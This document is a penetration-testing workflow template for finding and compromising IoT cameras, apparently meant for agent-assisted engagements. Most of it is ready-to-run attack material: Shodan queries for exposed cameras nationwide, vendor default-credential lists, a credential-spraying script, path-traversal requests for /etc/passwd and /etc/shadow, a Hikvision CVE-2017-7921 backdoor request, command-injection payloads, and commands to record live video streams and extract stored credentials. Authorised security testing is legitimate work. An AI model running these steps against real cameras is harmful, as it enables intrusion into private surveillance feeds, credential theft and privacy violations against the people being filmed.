# IoT Camera Discovery & Assessment Pipeline

> **Template Version:** 1.0
> **Derived From:** Historical engagements
> **Purpose:** Systematic IoT camera enumeration and vulnerability assessment

Use this workflow to identify camera services and assess their interfaces. Keep discovery and protocol requests within the approved scope.

Use command examples in an operator analysis workspace.
During governed agent work, use existing phase directories under `.bra/artifacts/`.
Store finding records in `layer3-engagement/NOTES/FINDINGS.md`.
Replace example targets with the approved scope values.

---

## Pipeline Overview

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  Discovery  │ → │ Enumeration  │ → │  Protocol   │ → │ Exploitation│
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
      │                  │                  │                  │
   Shodan/scan      port scanning       RTSP/ONVIF         auth bypass
```

---

## Phase 1: Passive Discovery

### Shodan Queries
```bash
# Generic IP camera search
shodan search "IP Camera" --fields ip_str,port,org

# Specific vendors
shodan search "product:Hikvision"
shodan search "product:Dahua"
shodan search "product:Foscam"
shodan search "product:Axis"

# By protocol
shodan search "port:554 rtsp"
shodan search "port:8000 onvif"

# Export results
shodan download cameras.json.gz "port:554 country:US"
```

### Censys Queries
```bash
# Camera web interfaces
censys search "services.http.response.body:camera"

# RTSP servers
censys search "services.port:554"

# ONVIF devices
censys search "services.http.response.body:onvif"
```

### Certificate Search
```bash
# Devices with self-signed certs (common in cameras)
shodan search "ssl.cert.issuer.cn:camera"

# Specific manufacturer certs
shodan search "ssl.cert.subject.cn:hikvision"
```

### Deliverable
- [ ] `passive_discovery.txt` - List of potential targets

---

## Phase 2: Active Discovery

### Network Scanning
```bash
# Fast port scan for camera ports
masscan <target_range> \
    -p80,443,554,8000,8080,8443,8554,8899,49152 \
    --rate=10000 \
    -oL masscan_cameras.txt

# Service detection
nmap -sV -p80,443,554,8000,8080,8443,8554 \
    -iL targets.txt \
    -oA nmap_cameras

# UDP services (UPnP, mDNS)
nmap -sU -p1900,5353 <target_range>
```

### Protocol-Specific Discovery

#### RTSP Discovery
```bash
# Nmap RTSP scripts
nmap --script rtsp-* -p 554,8554 <target>

# Custom RTSP probe
echo "OPTIONS * RTSP/1.0\r\nCSeq: 1\r\n\r\n" | nc -w5 <ip> 554
```

#### ONVIF Discovery
```bash
# WS-Discovery probe
cat > ws_discovery.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Header>
    <wsa:Action xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">
      http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe
    </wsa:Action>
  </Header>
  <Body>
    <Probe xmlns="http://schemas.xmlsoap.org/ws/2005/04/discovery">
      <Types>dn:NetworkVideoTransmitter</Types>
    </Probe>
  </Body>
</Envelope>
EOF

# Send multicast probe
echo -n "$(cat ws_discovery.xml)" | nc -u -w5 239.255.255.250 3702
```

#### UPnP Discovery
```bash
# UPnP M-SEARCH
cat > msearch.txt << 'EOF'
M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
MAN: "ssdp:discover"
MX: 3
ST: urn:schemas-upnp-org:device:Basic:1

EOF

nc -u -w5 239.255.255.250 1900 < msearch.txt
```

### Web Interface Fingerprinting
```bash
# HTTP probing with httpx
httpx -l targets.txt \
    -title -tech-detect -status-code -content-length \
    -o httpx_cameras.txt

# Screenshot capture
eyewitness --web -f targets.txt --timeout 15
```

### Deliverable
- [ ] `active_discovery.csv` - Confirmed camera targets with ports/protocols

---

## Phase 3: Protocol Assessment

### RTSP Testing

#### Stream Enumeration
```bash
# Common RTSP paths
paths=(
    "/live"
    "/stream"
    "/stream1"
    "/ch00_0"
    "/cam/realmonitor"
    "/Streaming/Channels/1"
    "/video1"
    "/h264"
    "/media/video1"
    "/onvif1"
)

for path in "${paths[@]}"; do
    echo "Testing: rtsp://<ip>:554$path"
    ffprobe -v error -rtsp_transport tcp "rtsp://<ip>:554$path" 2>&1 | head -5
done
```

#### Authentication Testing
```bash
# No auth
ffplay -rtsp_transport tcp "rtsp://<ip>:554/stream"

# Default credentials
ffplay -rtsp_transport tcp "rtsp://admin:admin@<ip>:554/stream"
ffplay -rtsp_transport tcp "rtsp://admin:123456@<ip>:554/stream"
ffplay -rtsp_transport tcp "rtsp://admin:@<ip>:554/stream"

# Common defaults by vendor
# Hikvision: admin:12345, admin:hiklinux
# Dahua: admin:admin, admin:888888
# Axis: root:pass
```

#### RTSP Fuzzing
```bash
# Malformed requests
printf "DESCRIBE rtsp://<ip>/stream RTSP/1.0\r\nCSeq: 1\r\n%s\r\n" \
    "$(python3 -c 'print("A"*5000)')" | nc -w5 <ip> 554
```

### ONVIF Testing

#### Device Information
```bash
# Using onvif-cli
onvif-cli -u admin -p admin http://<ip>:8000/onvif/device_service \
    GetDeviceInformation

# Python onvif library
python3 << 'EOF'
from onvif import ONVIFCamera
cam = ONVIFCamera('<ip>', 8000, 'admin', 'admin')
info = cam.devicemgmt.GetDeviceInformation()
print(info)
EOF
```

#### Capability Enumeration
```bash
# Get services
onvif-cli -u admin -p admin http://<ip>:8000/onvif/device_service \
    GetServices

# Get capabilities
onvif-cli -u admin -p admin http://<ip>:8000/onvif/device_service \
    GetCapabilities
```

#### Stream URI Retrieval
```python
from onvif import ONVIFCamera

cam = ONVIFCamera('<ip>', 8000, 'admin', 'admin')
media = cam.create_media_service()
profiles = media.GetProfiles()

for profile in profiles:
    uri = media.GetStreamUri({
        'StreamSetup': {
            'Stream': 'RTP-Unicast',
            'Transport': {'Protocol': 'RTSP'}
        },
        'ProfileToken': profile.token
    })
    print(f"Profile {profile.token}: {uri.Uri}")
```

### HTTP API Testing

#### Endpoint Discovery
```bash
# Common camera API paths
endpoints=(
    "/cgi-bin/snapshot.cgi"
    "/ISAPI/Streaming/channels/1/picture"
    "/api/mjpeg/stream"
    "/video/mjpg.cgi"
    "/axis-cgi/mjpg/video.cgi"
    "/snapshot.jpg"
    "/image/jpeg.cgi"
)

for ep in "${endpoints[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "http://<ip>$ep")
    echo "$ep: $status"
done
```

#### Authentication Bypass Attempts
```bash
# Path traversal
curl "http://<ip>/../../etc/passwd"
curl "http://<ip>/cgi-bin/../../../etc/passwd"

# Parameter manipulation
curl "http://<ip>/api/login?user=admin&pass=../../../etc/shadow"

# Auth bypass paths
curl "http://<ip>/images/../config.xml"
curl "http://<ip>/js/../system/deviceinfo"
```

### Deliverable
- [ ] `protocol_assessment.md` - Protocol vulnerabilities found

---

## Phase 4: Vulnerability Exploitation

### Default Credential Attacks

#### Credential Database
```
# Format: vendor:user:password
hikvision:admin:12345
hikvision:admin:hiklinux
dahua:admin:admin
dahua:admin:888888
dahua:admin:
axis:root:pass
foscam:admin:
amcrest:admin:admin
uniview:admin:123456
```

#### Automated Testing
```bash
#!/bin/bash
# cred_spray.sh

target=$1
creds_file="camera_creds.txt"

while IFS=: read -r vendor user pass; do
    echo "Testing $user:$pass on $target"

    # RTSP
    timeout 5 ffprobe -v quiet -rtsp_transport tcp \
        "rtsp://$user:$pass@$target:554/stream" 2>&1 && \
        echo "[+] RTSP: $user:$pass"

    # HTTP
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -u "$user:$pass" "http://$target/")
    [[ "$status" == "200" ]] && echo "[+] HTTP: $user:$pass"

done < "$creds_file"
```

### Known Vulnerability Exploitation

#### CVE Database Check
```bash
# Search for camera CVEs
searchsploit <vendor> camera
searchsploit <model>

# Example CVEs:
# CVE-2017-7921 - Hikvision backdoor
# CVE-2021-36260 - Hikvision command injection
# CVE-2020-25078 - D-Link info disclosure
```

#### Hikvision Backdoor (CVE-2017-7921)
```bash
# Check for vulnerable firmware
curl "http://<ip>/System/configurationFile?auth=YWRtaW46MTEK"

# If vulnerable, retrieves config with credentials
```

#### Command Injection Testing
```bash
# ONVIF command injection (various CVEs)
curl -X POST "http://<ip>:8000/onvif/device_service" \
    -H "Content-Type: application/soap+xml" \
    -d '...<SystemReboot>;id;#</SystemReboot>...'

# CGI injection
curl "http://<ip>/cgi-bin/admin.cgi?cmd=ls%20-la"
```

### Deliverable
- [ ] `exploitation_results.md` - Successful exploits

---

## Phase 5: Post-Exploitation

### Stream Capture
```bash
# Save RTSP stream
ffmpeg -i "rtsp://admin:admin@<ip>:554/stream" \
    -c copy -t 60 capture.mp4

# Screenshot
ffmpeg -i "rtsp://admin:admin@<ip>:554/stream" \
    -frames:v 1 snapshot.jpg
```

### Configuration Extraction

Set `CAMERA_USER` and `CAMERA_PASSWORD` to the approved credentials.

```bash
# Download config file
curl --user "${CAMERA_USER}:${CAMERA_PASSWORD}" "http://<ip>/System/configurationFile" > config.xml

# Parse for sensitive data
grep -iE "password|key|secret" config.xml
```

### Firmware Analysis
```bash
# Download firmware (if available)
curl "http://<ip>/firmware/current.bin" > firmware.bin

# Extract
binwalk -e firmware.bin

# Look for hardcoded creds
grep -r "password" _firmware.bin.extracted/
```

### Deliverable
- [ ] Evidence captures (screenshots, video)
- [ ] Configuration extracts
- [ ] Firmware analysis (if applicable)

---

## Attack Surface Summary

| Service | Port | Auth Method | Common Issues |
|---------|------|-------------|---------------|
| RTSP | 554, 8554 | Digest/None | No auth, weak creds |
| ONVIF | 8000, 80 | WS-Security | XXE, default creds |
| HTTP UI | 80, 8080 | Basic/Form | Injection, traversal |
| HTTPS | 443, 8443 | Same as HTTP | Weak TLS, same bugs |
| UPnP | 49152+ | None | Info disclosure |
| Telnet | 23 | Password | Default creds, shell |

---

## Checklist

- [ ] Passive discovery complete (Shodan, Censys)
- [ ] Active scanning complete (ports, services)
- [ ] RTSP streams enumerated
- [ ] ONVIF services tested
- [ ] HTTP APIs assessed
- [ ] Default credentials tested
- [ ] Known CVEs checked
- [ ] Evidence captured
- [ ] Report generated
